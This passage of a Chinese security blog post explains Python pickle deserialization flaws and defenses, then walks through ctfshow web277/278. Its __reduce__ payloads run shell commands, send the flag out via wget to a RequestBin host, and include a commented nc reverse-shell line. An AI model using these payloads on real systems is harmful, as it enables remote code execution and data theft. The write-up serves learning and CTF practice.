alt="image-20230422171046289"></p><h4 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h4><h5 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h5><p>pvm由三个部分组成:</p><ul><li>指令处理器: 从流中读取<code>opcode</code>和参数, 并对其进行解释处理. 重复这个动作, 直到遇到<code>.</code>这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回</li><li>栈区(stack): 由python的list实现, 被用来临时存储数据/参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化结果</li><li>标签区(memo): 由python的dict实现, 为pvm的整个生命周期提供存储</li></ul><h5 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h5><p>首先, <code>pvm</code>会把源码编译成字节码, 字节码是python语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行. 如果python进程在主机上有写入权限, 那么它会把程序字节码保存为一个以<code>.pyc</code>为扩展名的文件, 如果没有写入权限, 则python进程会在内存马中生成字节码, 在程序执行结束后被自动丢弃</p><p>一般来说, 在构建程序时最好给Python进程在主机上的写入权限, 这样只要源代码没有改变, 生成的<code>.pyc</code>文件就可以被重复利用, 提高执行效率, 同时隐藏源代码</p><p>然后, Python进程会把编译好的字节码转发到<code>PVM</code>(Python虚拟机)中, <code>PVM</code>会循环迭代执行字节码指令, 直到所有操作被完成</p><h5 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h5><p>这里贴一下<a class="link" target="_blank" rel="noopener" href="https://docs.python.org/2/library/pickle.html">官方文档<i class="fas fa-external-link-alt"></i></a></p><p>当前用于<code>pickling</code>的协议有6种, 使用的协议版本越高, 读取生成的<code>pickle</code>所需的<code>python</code>版本越新</p><ul><li><code>v0</code>版协议是原始的人类可读协议, 并且向后兼容早期版本的python</li><li><code>v1</code>版协议是较早的二进制格式, 它也与早期版本的python兼容</li><li><code>v2</code>版协议是在python2.3中引入的, 它为存储<code>new-style class</code>提供了更高效的机制, 参阅<code>PEP 307</code></li><li><code>v3</code>版协议添加于python3.0, 他具有对<code>bytes</code>对象的显示支持, 且无法被<code>python2.x</code>打开, 这是目前默认使用的协议, 也是在要求与其他<code>python3</code>版本兼容时的推荐协议</li><li><code>v4</code>版协议添加于python3.4, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅<code>PEP 3154</code></li><li><code>v5</code>版协议添加于python3.8, 它支持外带数据, 加速带内数据处理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span></span><br><span class="line"><span class="comment"># here is in kind-of alphabetical order of 1-character pickle code.</span></span><br><span class="line"><span class="comment"># pickletools groups them by purpose.</span></span><br><span class="line"></span><br><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 2</span></span><br><span class="line"></span><br><span class="line">PROTO          = <span class="string">b&#x27;\x80&#x27;</span>  <span class="comment"># identify pickle protocol</span></span><br><span class="line">NEWOBJ         = <span class="string">b&#x27;\x81&#x27;</span>  <span class="comment"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line">EXT1           = <span class="string">b&#x27;\x82&#x27;</span>  <span class="comment"># push object from extension registry; 1-byte index</span></span><br><span class="line">EXT2           = <span class="string">b&#x27;\x83&#x27;</span>  <span class="comment"># ditto, but 2-byte index</span></span><br><span class="line">EXT4           = <span class="string">b&#x27;\x84&#x27;</span>  <span class="comment"># ditto, but 4-byte index</span></span><br><span class="line">TUPLE1         = <span class="string">b&#x27;\x85&#x27;</span>  <span class="comment"># build 1-tuple from stack top</span></span><br><span class="line">TUPLE2         = <span class="string">b&#x27;\x86&#x27;</span>  <span class="comment"># build 2-tuple from two topmost stack items</span></span><br><span class="line">TUPLE3         = <span class="string">b&#x27;\x87&#x27;</span>  <span class="comment"># build 3-tuple from three topmost stack items</span></span><br><span class="line">NEWTRUE        = <span class="string">b&#x27;\x88&#x27;</span>  <span class="comment"># push True</span></span><br><span class="line">NEWFALSE       = <span class="string">b&#x27;\x89&#x27;</span>  <span class="comment"># push False</span></span><br><span class="line">LONG1          = <span class="string">b&#x27;\x8a&#x27;</span>  <span class="comment"># push long from &lt; 256 bytes</span></span><br><span class="line">LONG4          = <span class="string">b&#x27;\x8b&#x27;</span>  <span class="comment"># push really big long</span></span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 3 (Python 3.x)</span></span><br><span class="line"></span><br><span class="line">BINBYTES       = <span class="string">b&#x27;B&#x27;</span>   <span class="comment"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = <span class="string">b&#x27;C&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 4</span></span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = <span class="string">b&#x27;\x8c&#x27;</span>  <span class="comment"># push short string; UTF-8 length &lt; 256 bytes</span></span><br><span class="line">BINUNICODE8      = <span class="string">b&#x27;\x8d&#x27;</span>  <span class="comment"># push very long string</span></span><br><span class="line">BINBYTES8        = <span class="string">b&#x27;\x8e&#x27;</span>  <span class="comment"># push very long bytes string</span></span><br><span class="line">EMPTY_SET        = <span class="string">b&#x27;\x8f&#x27;</span>  <span class="comment"># push empty set on the stack</span></span><br><span class="line">ADDITEMS         = <span class="string">b&#x27;\x90&#x27;</span>  <span class="comment"># modify set by adding topmost stack items</span></span><br><span class="line">FROZENSET        = <span class="string">b&#x27;\x91&#x27;</span>  <span class="comment"># build frozenset from topmost stack items</span></span><br><span class="line">NEWOBJ_EX        = <span class="string">b&#x27;\x92&#x27;</span>  <span class="comment"># like NEWOBJ but work with keyword only arguments</span></span><br><span class="line">STACK_GLOBAL     = <span class="string">b&#x27;\x93&#x27;</span>  <span class="comment"># same as GLOBAL but using names on the stacks</span></span><br><span class="line">MEMOIZE          = <span class="string">b&#x27;\x94&#x27;</span>  <span class="comment"># store top of the stack in memo</span></span><br><span class="line">FRAME            = <span class="string">b&#x27;\x95&#x27;</span>  <span class="comment"># indicate the beginning of a new frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Protocol 5</span></span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = <span class="string">b&#x27;\x96&#x27;</span>  <span class="comment"># push bytearray</span></span><br><span class="line">NEXT_BUFFER      = <span class="string">b&#x27;\x97&#x27;</span>  <span class="comment"># push next out-of-band buffer</span></span><br><span class="line">READONLY_BUFFER  = <span class="string">b&#x27;\x98&#x27;</span>  <span class="comment"># make top of stack readonly</span></span><br></pre></td></tr></table></figure><p>上文谈到了<code>opcode</code>是有多个版本的, 在进行序列化时可以通过<code>protocol=num</code>来选择<code>opcode</code>的版本, 指定的版本必须小于等于<code>5</code>.</p><h4 id="漏洞出现位置"><a href="#漏洞出现位置" class="headerlink" title="漏洞出现位置"></a>漏洞出现位置</h4><ol><li>通常在解析认证token/session的时候, 现在很多web服务都在使用<code>redis</code>/<code>mongodb</code>/<code>memcached</code>等来存储session等状态信息</li><li>可能将对象<code>pickle</code>后存储成磁盘文件</li><li>可能将对象<code>pickle</code>后在网络中传输</li></ol><blockquote><p>其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的</p></blockquote><h4 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h4><p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化, 反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触犯恶意代码</p><p>简单来说, <code>__reduce__()</code>魔术方法类似于php中的<code>__wakeup()</code>方法, 在反序列化时会调用<code>__reduce__()</code>魔术方法</p><ol><li>如果返回值是一个字符串, 那么将会去当前作用域中查找字符串值对应名字的对象, 将其反序列化后返回</li><li>如果返回的是一个元组, 要求是2-6个参数(python3.8新加入元组的第六项)<ol><li>第一个参数是可调用的对象.</li><li>第二个是该对象所需的参数元组, 如果可调用对象不接受参数则必须提供一个空元组.</li><li>第三个是用于表示对象的状态的可选元素, 将被传给前述的<code>__setstate__()</code>方法, 如果对象没有此方法, 则这个元素必须是字典类型并会被添加至<code>__dict__</code>属性中.</li><li>第四个是用于返回连续项的迭代器的可选元素.</li><li>第五个是用于返回连续键值对的迭代器的可选元素.</li><li>第六个是一个带有<code>(obj, state)</code>签名的可调用对象的可选元素.</li></ol></li></ol><h4 id="基本payload"><a href="#基本payload" class="headerlink" title="基本payload"></a>基本payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">pickle.loads(pickle.dumps(demo))</span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230422222050050.png" alt="image-20230422222050050"></p><h4 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h4><ul><li>采用用更高级的接口<code>__getnewargs()</code>、<code>__getstate__()</code>、<code>__setstate__()</code>等代替<code>__reduce__()</code>魔术方法</li><li>进行反序列化操作之前进行严格的过滤, 若采用的是<code>pickle</code>库可采用装饰器实现</li><li>在传递序列化对象前请进行签名或者加密，防止篡改和重播</li><li>如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据</li><li>不要再不守信任的通道中传递 pcikle 序列化对象</li><li>将 pickle 加载的数据列入白名单</li></ul><h3 id="做俩题"><a href="#做俩题" class="headerlink" title="做俩题"></a>做俩题</h3><p>这里开个ctfshow的web277和web278做一做</p><p>源码中可以看到hint<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230423194531848.png" alt="image-20230423194531848"></p><p>然后这里我们尝试构造一下payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        shell = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">payload = pickle.dumps(demo)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230423195323229.png" alt="image-20230423195323229"></p><p>并没有打通, 尝试dns外带也不行, 这里看网上大佬提供了一种 RequestBin方法, 这里借用buu的<a class="link" target="_blank" rel="noopener" href="http://http.requestbin.buuoj.cn/">requestbin平台<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#shell = &#x27;wget `id|base64`.wjqfgx.dnslog.cn&#x27;</span></span><br><span class="line">        shell = <span class="string">&#x27;wget http://http.requestbin.buuoj.cn/1h6hdxc1?c=`cat fla*`&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">payload = pickle.dumps(demo)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br></pre></td></tr></table></figure><p>额…这里我也没带出来</p><p>那么这二者有什么区别呢, 虽然结果是都没带出来</p><blockquote><p>RequestBin和DNSLog都是用于测试和调试网络应用程序的工具，但它们的主要区别在于它们所记录的信息类型。</p><p>RequestBin外带是一种HTTP请求捕获工具，可以捕获来自任何来源的HTTP请求，并为您提供一个临时网址，在这个网址上，您可以查看请求的详细信息，包括请求头、请求参数等。RequestBin外带通常用于测试Webhook以及与第三方API的交互等。</p><p>DNSLog外带则是一种用于捕获DNS请求的工具，它可以捕获通过您指定的DNS服务器发送的所有DNS请求，并将其记录下来。DNSLog外带通常用于发现恶意软件和网络攻击，例如域名劫持、DNS投毒等情况。</p><p>RequestBin适用于检查HTTP请求，而DNSLog适用于检查所有类型的网络请求。RequestBin需要向外部服务器发送请求来获取请求的详细信息，而DNSLog则不需要连接到外部服务器即可捕获网络请求。</p></blockquote><p>这里我们采用第三种方法, 反弹shell也失败, 那么就可能是我们payload的问题了, 有可能是没有system模块, 这里我们换一个payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;wget http://http.requestbin.buuoj.cn/1h6hdxc1?c=`cat fla*`&#x27;).read()&quot;</span>,))</span><br><span class="line">        <span class="comment">#return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc ip port -e /bin/sh&#x27;).read()&quot;,))</span></span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">ctf = pickle.dumps(demo)</span><br><span class="line"><span class="comment">#df = pickle.loads(demo)</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(ctf))</span><br></pre></td></tr></table></figure><p>试了几次不能用bash,最后用了/bin/sh,因为环境里面没有装bash,得不到响应nc连上就会自动断开</p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230423204754659.png" alt="image-20230423204754659"></p><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230423204813979.png" alt="image-20230423204813979"></p></div><div class="post-copyright-info"><div class="article-copyright-info-container"><ul class="copyright-info-content"><li class="post-title"><span class="type">Post title</span>: <span class="content">Web10_pyweb+flaskssti+反序列化</span></li><li class="post-author"><span class="type">Post author</span>: <span class="content">Charmersix</span></li><li class="post-time"><span class="type">Create time</span>: <span class="content">2023-04-23 21:49:29</span></li><li class="post-link"><span class="type">Post link</span>: <span class="content">2023/04/23/web10-pyweb-flaskssti-反序列化/</span></li><li class="post-license"><span class="type">Copyright notice</span>: <span class="content">All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.</span></li></ul><div class="copy-copyright-info flex-center tooltip" data-content="Copy copyright info" data-offset-y="-2px"><i class="fa-solid fa-copy"></i></div></div></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/Web/">#Web</a>&nbsp;</li><li class="tag-item"><a href="/tags/Study/">#Study</a>&nbsp;</li><li class="tag-item"><a href="/tags/Python/">#Python</a>&nbsp;</li><li class="tag-item"><a href="/tags/SSTI/">#SSTI</a>&nbsp;</li><li class="tag-item"><a href="/tags/Flask/">#Flask</a>&nbsp;</li><li class="tag-item"><a href="/tags/pickle/">#pickle</a>&nbsp;</li><li class="tag-item"><a href="/tags/py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#py反序列化</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2023/04/25/AWD/"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">Web_番外篇_AWD芝士</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2023/03/24/web_9_PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="title flex-center"><span class="post-nav-title-item">Web_9_PHP代码审计</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;Comments</div><div class="waline-comment-container"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline-meta.css"><script src="//unpkg.com/@waline/client@v2/dist/waline.js"></script><div id="waline-comment"></div><script>function loadWaline(){Waline.init({el:"#waline-comment",serverURL:"https://waline-charmersix.vercel.app/",lang:"en",comment:".post-comments-count",reaction:!0})}window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Flask%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">Flask学习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flask-PIN%E7%A0%81%E8%AE%A1%E7%AE%97"><span class="nav-number">2.</span> <span class="nav-text">Flask PIN码计算</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EFlask%E4%B8%8B%E7%9A%84SSTI"><span class="nav-number">3.</span> <span class="nav-text">基于Flask下的SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%92%8C%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="nav-number">3.1.</span> <span class="nav-text">python魔术方法和内置类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#class"><span class="nav-number">3.1.1.</span> <span class="nav-text">class</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#base"><span class="nav-number">3.1.2.</span> <span class="nav-text">base</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mro"><span class="nav-number">3.1.3.</span> <span class="nav-text">mro</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#subclasses"><span class="nav-number">3.1.4.</span> <span class="nav-text">subclasses()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E5%90%8D%E7%A7%B0%E5%8F%AF%E6%8E%A7"><span class="nav-number">3.2.</span> <span class="nav-text">模板名称可控</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E5%86%85%E5%AE%B9%E5%8F%AF%E6%8E%A7"><span class="nav-number">3.3.</span> <span class="nav-text">模板内容可控</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">3.3.1.</span> <span class="nav-text">做题思路</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flask%E7%9A%84ssti%E7%9A%84%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-number">3.4.</span> <span class="nav-text">flask的ssti的过滤与绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4"><span class="nav-number">3.4.1.</span> <span class="nav-text">绕过.过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4-1"><span class="nav-number">3.4.2.</span> <span class="nav-text">绕过_过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 